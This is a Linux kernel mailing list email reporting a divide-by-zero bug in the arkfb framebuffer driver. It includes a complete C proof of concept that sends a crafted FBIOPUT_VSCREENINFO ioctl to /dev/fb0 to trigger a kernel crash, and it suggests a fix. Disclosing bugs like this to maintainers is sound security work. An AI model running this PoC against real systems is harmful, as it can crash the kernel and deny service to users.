Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 7FE935822D1
	for <lists+linux-kernel@lfdr.de>; Wed, 27 Jul 2022 11:09:37 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231405AbiG0JJa (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Wed, 27 Jul 2022 05:09:30 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:48378 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S231627AbiG0JIv (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Wed, 27 Jul 2022 05:08:51 -0400
Received: from mail-pf1-x42d.google.com (mail-pf1-x42d.google.com [IPv6:2607:f8b0:4864:20::42d])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D483548CAB;
        Wed, 27 Jul 2022 02:07:28 -0700 (PDT)
Received: by mail-pf1-x42d.google.com with SMTP id o12so15545661pfp.5;
        Wed, 27 Jul 2022 02:07:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=WdjHuRxAl4NImVFIF4JC02Fp7SCGdh6XVUJ8vK99+aY=;
        b=ncLcqy6RH5X84w9V5TliSJ1AfuprYyfl2xZtNKIjiMw6kvHmhS0O5CSH0oEQC/4Zxv
         uzKCknzlSwrbjPrFa0KzpEE9mSfA08jHMAFZbEsZEshSUfFro5G23QZK/wo3dqc5duH0
         Lol55r/HjF635EBQ9sDkVKT/vMOLrMp8XpkX6E2mpzUTOhtdWfFh6n2iEwz2bXk8M+cy
         qiH4UTh0ad0thYxTN4FCNUQ8+kM3Ix49rS86xTQOvMQLVfi4MKnLw0+reJ5fkIs3DBjI
         OQ9vHZUz34FlK+ni3Z9pVQ8GOkvhoHySepcgfyBRs3kh48I37PkvfyJbAywY9Lz+4AvP
         VxUQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=WdjHuRxAl4NImVFIF4JC02Fp7SCGdh6XVUJ8vK99+aY=;
        b=JP/thpCMU3DhSoPSz9KMIlqzij2Kp75f39ZwxQBseIyERd7xuTTUFxPpbU3H3LJQI4
         BgGBiAI8D0TNM+3qkX++vcwbYhdEPuoVBaTMcs5JJrBzLnuHWbEzhliBVYMrj9+krwJT
         XrNvNqbougYfcyfiyuYX2P+PPkzmz5QN/034MM3Js2zKFsucih9YSR1vo0Uz0kneR6Er
         5MhIN/H9EnKICY6NRBRqiI1YZiffXLdyrN/C0DY8c86tqKGm4Yb+w7eXsJO+FqepyZjW
         6565Dk3wAr8Erq1OUlbonFaFkMmFj7EMciCWAMUfjQXAvVbMXiVLyNFrfaiA/TxOG3US
         1grA==
X-Gm-Message-State: AJIora871u0n6FR75rWgMk17H1dXHHq9zXptIMQEyLesmiIu//qLa+6t
        GYgh+P12iKHlKGJPbbgzbCH26uTsO0jLDlVNSFgdQbfirymEjOE=
X-Google-Smtp-Source: AGRyM1vH/AEHYfbs3aWF0iR26kLMNpggartHuW2PnZK1D5a+ET0ksgorCUOsRG+F8rVfm3t1ZwjFgIc1WMSfJSMwbOQ=
X-Received: by 2002:a63:f809:0:b0:41b:4a4c:4fbf with SMTP id
 n9-20020a63f809000000b0041b4a4c4fbfmr1260766pgh.616.1658912848298; Wed, 27
 Jul 2022 02:07:28 -0700 (PDT)
MIME-Version: 1.0
From:   Zheyu Ma <zheyuma97@gmail.com>
Date:   Wed, 27 Jul 2022 17:07:17 +0800
Message-ID: <CAMhUBjkps_2EAkbCpGuLiWVFObLkLuj=3UqbxcuENUNXMkbS9Q@mail.gmail.com>
Subject: [BUG] video: fbdev: arkfb: Found a divide-by-zero bug which may cause DoS
To:     Helge Deller <deller@gmx.de>
Cc:     Linux Fbdev development list <linux-fbdev@vger.kernel.org>,
        DRI Development <dri-devel@lists.freedesktop.org>,
        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"
X-Spam-Status: No, score=-1.8 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_ENVFROM_END_DIGIT,
        FREEMAIL_FROM,RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS autolearn=ham
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hello,

I found a bug in the arkfb driver in the latest kernel, which may cause DoS.

The reason for this bug is that the user controls some input to ioctl,
making 'mode' 0x7 on line 704, which causes hdiv = 1, hmul = 2, and if
the pixclock is controlled to be 1, it will cause a division error in
the function ark_set_pixclock().

Here is a simple PoC:

#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>

typedef unsigned int __u32;

#define FBIOPUT_VSCREENINFO 0x4601

struct fb_bitfield {
__u32 offset; /* beginning of bitfield */
__u32 length; /* length of bitfield */
__u32 msb_right; /* != 0 : Most significant bit is */
/* right */
};

struct fb_var_screeninfo {
__u32 xres; /* visible resolution */
__u32 yres;
__u32 xres_virtual; /* virtual resolution */
__u32 yres_virtual;
__u32 xoffset; /* offset from virtual to visible */
__u32 yoffset; /* resolution */

__u32 bits_per_pixel; /* guess what */
__u32 grayscale; /* 0 = color, 1 = grayscale, */
/* >1 = FOURCC */
struct fb_bitfield red; /* bitfield in fb mem if true color, */
struct fb_bitfield green; /* else only length is significant */
struct fb_bitfield blue;
struct fb_bitfield transp; /* transparency */

__u32 nonstd; /* != 0 Non standard pixel format */

__u32 activate; /* see FB_ACTIVATE_* */

__u32 height; /* height of picture in mm    */
__u32 width; /* width of picture in mm     */

__u32 accel_flags; /* (OBSOLETE) see fb_info.flags */

/* Timing: All values in pixclocks, except pixclock (of course) */
__u32 pixclock; /* pixel clock in ps (pico seconds) */
__u32 left_margin; /* time from sync to picture */
__u32 right_margin; /* time from picture to sync */
__u32 upper_margin; /* time from sync to picture */
__u32 lower_margin;
__u32 hsync_len; /* length of horizontal sync */
__u32 vsync_len; /* length of vertical sync */
__u32 sync; /* see FB_SYNC_* */
__u32 vmode; /* see FB_VMODE_* */
__u32 rotate; /* angle we rotate counter clockwise */
__u32 colorspace; /* colorspace for FOURCC-based modes */
__u32 reserved[4]; /* Reserved for future compatibility */
};

struct fb_var_screeninfo var;

int main(void) {
int fd, ret;

fd = open("/dev/fb0", O_RDONLY);
if (fd < 0) {
perror("Failed to open the device");
return 1;
}
var.xres = 40;
var.yres = 40;
var.hsync_len = 1;
var.vsync_len = 1;
var.pixclock = 1;
var.bits_per_pixel = 32;

ret = ioctl(fd, FBIOPUT_VSCREENINFO, &var);
if (ret < 0) {
perror("Failed to call the ioctl");
return 1;
}
return 0;
}

The easiest patch is to check the value of the argument 'pixclock' in
the ark_set_pixclock function, but this is perhaps too late, should we
do this check earlier? I'm not sure, so I'll report this bug to you.

regards,

Zheyu Ma
